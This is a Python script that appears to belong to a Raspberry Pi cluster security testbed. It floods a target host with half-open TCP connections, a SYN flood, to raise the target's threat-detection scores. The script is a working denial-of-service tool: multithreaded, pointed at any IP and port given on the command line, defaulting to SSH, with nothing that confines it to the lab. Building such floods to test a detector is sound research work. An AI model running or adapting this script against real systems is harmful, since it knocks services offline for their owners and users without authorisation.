#!/usr/bin/env python3
"""
ATTACK 1 — SYN Flood Denial-of-Service (Threat Scenario III.B.1)
=================================================================
Generates a high volume of TCP SYN packets toward a target, leaving
many half-open connections in the SYN_RECV state. This is what the
cluster head's CTS metric detects via psutil (the S term in NAS).

This is a REAL SYN flood using many rapid half-open TCP connects.
It does NOT complete the handshake, so connections pile up in SYN_RECV
on the TARGET, driving up its NAS -> CTS -> threat stars -> stronger profile.

Usage:
    python3 attack_syn_flood.py --target 10.25.96.150 --port 9999 --duration 30

IMPORTANT: Run this ON A THIRD MACHINE (or the node Pi) aimed at the
cluster head Pi. The cluster head's own psutil readings are what climb.
To make SYN_RECV appear on the cluster head, aim at a TCP port that is
open/listening. Since the system uses UDP for data, use --port 22 (SSH)
or any open TCP port on the target to generate real half-open connections.
"""
import argparse
import random
import socket
import threading
import time
import sys

def _c(code, t): return f"\033[{code}m{t}\033[0m"
def RED(t):    return _c("91", t)
def GREEN(t):  return _c("92", t)
def YELLOW(t): return _c("93", t)
def BOLD(t):   return _c("1", t)

stop_flag = False
sent_count = 0
count_lock = threading.Lock()

def flood_worker(target: str, port: int):
    """Open half-open TCP connections as fast as possible."""
    global sent_count
    while not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            # Fire the SYN by initiating connect, then abandon it
            try:
                s.connect_ex((target, port))
            except Exception:
                pass
            with count_lock:
                sent_count += 1
            # Deliberately DO NOT close cleanly / DO NOT complete handshake.
            # Leave socket dangling briefly to hold the half-open state.
            # We keep a reference-free socket that will be GC'd; the SYN is already out.
        except Exception:
            pass

def main():
    global stop_flag
    ap = argparse.ArgumentParser(description="SYN Flood DoS attack simulator")
    ap.add_argument("--target",   required=True, help="Target IP (the cluster head Pi)")
    ap.add_argument("--port",     type=int, default=22,
                    help="Target TCP port (use an OPEN port like 22/SSH so SYN_RECV builds)")
    ap.add_argument("--duration", type=int, default=30, help="Attack duration in seconds")
    ap.add_argument("--threads",  type=int, default=50, help="Concurrent flood threads")
    args = ap.parse_args()

    print(RED("═" * 60))
    print(RED(BOLD("  SYN FLOOD DoS ATTACK — Threat Scenario 1")))
    print(RED("═" * 60))
    print(f"  Target    : {BOLD(args.target)}:{args.port}")
    print(f"  Duration  : {args.duration}s")
    print(f"  Threads   : {args.threads}")
    print(YELLOW(f"  Goal      : Build SYN_RECV connections on target → raise its CTS"))
    print(RED("═" * 60))
    print()

    workers = []
    for _ in range(args.threads):
        t = threading.Thread(target=flood_worker, args=(args.target, args.port), daemon=True)
        t.start()
        workers.append(t)

    start = time.time()
    try:
        while time.time() - start < args.duration:
            time.sleep(1)
            with count_lock:
                c = sent_count
            elapsed = time.time() - start
            rate = c / max(1, elapsed)
            print(f"  [{elapsed:5.1f}s] SYN packets sent: {c:,}  "
                  f"({rate:,.0f}/sec)   "
                  + YELLOW("→ check target's CTS climbing"))
    except KeyboardInterrupt:
        print(YELLOW("\n  Interrupted."))

    stop_flag = True
    time.sleep(0.5)
    print()
    print(GREEN(f"  Attack complete. Total SYN packets: {sent_count:,}"))
    print(YELLOW("  On the cluster head you should have seen SYN_RECV rise,"))
    print(YELLOW("  NAS increase, CTS approach 1.0, and threat escalate to 4★."))

if __name__ == "__main__":
    main()
